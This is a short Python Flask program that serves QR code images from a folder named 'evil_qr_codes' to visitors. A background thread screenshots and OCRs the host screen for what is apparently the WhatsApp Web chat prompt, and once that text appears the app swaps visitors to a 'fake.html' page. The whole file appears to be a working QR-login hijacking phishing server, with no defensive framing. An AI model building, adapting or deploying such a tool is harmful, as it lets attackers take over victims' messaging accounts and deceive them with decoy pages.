from flask import Flask, render_template, jsonify
import os
import glob
import time
import base64
import pyautogui
import pyocr
import pyocr.builders
import threading



app = Flask(__name__)

render_xyz = False

def get_latest_qr_code():
    qr_code_dir = "evil_qr_codes"
    qr_code_files = glob.glob(os.path.join(qr_code_dir, "*.png"))
    if qr_code_files:
        latest_qr_code = max(qr_code_files, key=os.path.getctime)
        return latest_qr_code
    return None

def check_strings_in_screenshot(strings_to_check):
    try:
        screenshot = pyautogui.screenshot()
    except Exception as e:
        print(f"An error occurred while taking a screenshot: {str(e)}")
        return False

    tools = pyocr.get_available_tools()
    if len(tools) == 0:
        print("No OCR tool found. Install Tesseract OCR.")
        return False

    tool = tools[0]
    txt = tool.image_to_string(screenshot, lang='eng', builder=pyocr.builders.TextBuilder())

    for s in strings_to_check:
        if s in txt:
            return True

    return False

def background_check():
    global render_xyz
    strings_to_check = ["Search or start new chat"]
    while True:
        if check_strings_in_screenshot(strings_to_check):
            print("Text found in screenshot")
            render_xyz = True
        else:
            print("Text not found in screenshot")
            render_xyz = False
        time.sleep(1)

bg_thread = threading.Thread(target=background_check)
bg_thread.daemon = True
bg_thread.start()

@app.route('/')
def index():
    global render_xyz
    latest_qr_code = get_latest_qr_code()
    latest_qr_code_filename = os.path.basename(latest_qr_code) if latest_qr_code else None

    if render_xyz:
        return render_template('fake.html')
    else:
        return render_template('index.html', latest_qr_code_filename=latest_qr_code_filename)

@app.route('/xyz_html_rendered')
def xyz_html_rendered():
    return jsonify({"xyz_html_rendered": render_xyz})

@app.route('/latest_qr_code')
def latest_qr_code_image():
    latest_qr_code = get_latest_qr_code()
    if latest_qr_code:
        with open(latest_qr_code, "rb") as file:
            qr_image = base64.b64encode(file.read()).decode('utf-8')
            return jsonify({"qr_image": qr_image, "xyz_html_rendered": render_xyz})
    else:
        return jsonify({"qr_image": None, "xyz_html_rendered": render_xyz})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
